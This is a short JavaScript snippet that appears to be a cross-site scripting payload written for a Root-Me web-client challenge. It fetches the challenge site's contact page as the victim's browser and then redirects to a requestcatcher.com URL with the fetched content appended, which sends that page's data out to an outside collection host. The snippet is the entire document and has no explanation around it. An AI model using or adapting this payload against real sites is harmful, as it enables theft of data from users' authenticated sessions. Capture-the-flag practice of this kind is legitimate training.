const fn = async () => {
const req = await fetch('http://challenge01.root-me.org/web-client/ch23/index.php?action=contact');
const resp = await req.text();


window.location.href = `https://tyyhty.requestcatcher.com/${resp}`



};

fn()
